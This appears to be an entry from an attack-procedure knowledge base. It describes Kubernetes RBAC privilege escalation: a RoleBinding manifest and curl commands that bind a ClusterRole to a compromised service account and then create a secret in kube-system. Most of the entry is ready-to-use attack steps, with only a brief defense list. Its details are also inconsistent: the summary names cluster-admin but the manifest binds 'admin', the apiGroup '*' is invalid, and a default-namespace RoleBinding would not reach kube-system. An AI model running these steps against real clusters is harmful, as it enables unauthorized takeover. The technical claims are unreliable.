---
id: d52fef61-dd7c-46b7-80ec-a89e43f791ea
name: kubernetes-rbac-privilege-escalation-via-malicious-rolebinding
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.310218+00:00'
updated_at: '2023-04-10T20:34:00.632964+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
sub_techniques: []
tags:
  - '[[tags/Kubernetes]]'
  - '[[tags/RBAC]]'
  - '[[tags/Privilege Escalation]]'
commands:
  - '[[commands/curl-create-malicious-rolebinding]]'
  - '[[commands/curl-create-kube-system-secret]]'
platforms:
  - Kubernetes
tools: []
validated: true
---

# Kubernetes RBAC Privilege Escalation via Malicious RoleBinding

## Summary

This procedure exploits Kubernetes RBAC misconfigurations by creating a malicious RoleBinding that binds the cluster-admin ClusterRole to a compromised service account in the default namespace. This escalates the service account's privileges, allowing the attacker to perform unauthorized actions such as creating secrets in protected namespaces like kube-system. It requires initial authenticated access with permissions to create RoleBindings and targets clusters where service accounts can be compromised.

## Description

Kubernetes RBAC enables fine-grained access control to API resources. Attackers with limited permissions can manipulate RoleBindings to grant excessive privileges to service accounts they control or have compromised. This technique involves crafting a RoleBinding manifest that references the powerful 'admin' or 'cluster-admin' ClusterRole and applies it to a target service account. Once applied, the service account gains elevated permissions, enabling persistence, evasion, and further escalation. This is particularly dangerous in multi-tenant clusters or those with overly permissive default policies. The procedure assumes the attacker has obtained a JWT token for an account with RoleBinding creation rights and details of a compromised service account.

## Requirements

1. Authenticated JWT token with permissions to create RoleBindings in the target namespace (e.g., default).
2. Knowledge of a compromised service account name and namespace (e.g., 'sa-comp' in 'default').
3. Network access to the Kubernetes API server (IP and port, typically 6443).
4. curl tool installed on the attacker's machine.
5. A text editor to create the manifest file.

## Defense

- Enforce principle of least privilege: Restrict RoleBinding creation to admin users only and use namespace-scoped roles where possible.
- Implement admission controllers like PodSecurityAdmission or OPA Gatekeeper to validate RoleBindings before application.
- Monitor API server audit logs for unauthorized RoleBinding creations, especially bindings to high-privilege ClusterRoles.
- Regularly audit service accounts and rotate tokens; use workload identity federation to avoid long-lived secrets.
- Segment network access to the API server and enable RBAC debugging with 'kubectl auth can-i' checks.

## Objectives

1. Create and apply a malicious RoleBinding to escalate privileges on a compromised service account.
2. Verify escalation by performing an action in a restricted namespace, such as creating a secret in kube-system.
3. Establish persistence through elevated API access for further attacks.

## Instructions

### Step 1: Prepare the Malicious RoleBinding Manifest

**Context**: This step creates the JSON manifest defining the RoleBinding. The manifest binds the 'admin' ClusterRole (which grants full access within the namespace) to the compromised service account. Use a text editor to save this as 'malicious-rolebinding.json'. This file serves as the payload for the API request.

**Code** ([[codes/kubernetes-malicious-rolebinding-manifest]]):

```json
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespace": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp",
            "namespace": "default"
        }
    ]
}
```

> Save the content to 'malicious-rolebinding.json'. Verify the file contents match the manifest to ensure correct binding to the service account and ClusterRole.

### Step 2: Apply the Malicious RoleBinding

**Context**: Submit the manifest to the Kubernetes API server using curl. This authenticates with the attacker's JWT token and creates the RoleBinding in the default namespace. If successful, the compromised service account now inherits admin privileges.

**Command** ([[commands/curl-create-malicious-rolebinding]]):

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-rolebinding.json
```

> Replace placeholders with actual values: <JWT_TOKEN> is the attacker's token, <master_ip> is the API server IP, and <port> is typically 6443. The -k flag ignores SSL verification for testing. Success is indicated by a 201 Created response; failure may occur due to insufficient permissions or invalid manifest.

### Step 3: Verify Privilege Escalation

**Context**: Test the escalation by using the compromised service account's JWT to create a secret in the restricted kube-system namespace. This demonstrates access to sensitive system resources. Note: A minimal secret body is provided inline; adjust as needed for the attack.

**Command** ([[commands/curl-create-kube-system-secret]]):

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED_JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets -d '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"test-malicious-secret"},"data":{}}'
```

> Replace <COMPROMISED_JWT_TOKEN> with the token from the service account 'sa-comp', <master_ip>, and <port>. This creates an empty secret named 'test-malicious-secret'. If successful, it confirms escalation; otherwise, check for binding errors or token issues.
